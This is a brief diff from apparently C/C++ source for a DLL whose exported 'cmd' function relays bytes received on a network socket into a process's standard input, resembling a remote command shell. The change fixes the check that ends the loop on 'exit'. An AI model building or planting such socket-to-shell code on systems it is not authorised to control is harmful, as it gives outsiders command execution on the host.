@@ -77,7 +77,7 @@ extern "C" __declspec(dllexport) void cmd(const char *arg)
     for(;;){
         num = recv(DllMeta.net.sock, in_buf, SIZE, 0);
         WriteFile(rStdIn, in_buf, num, NULL, NULL);
-        if(!strstr("exit", in_buf)) break;
+        if(strstr(in_buf, "exit")) break;
     }
     
     TerminateThread(helpA, 0);
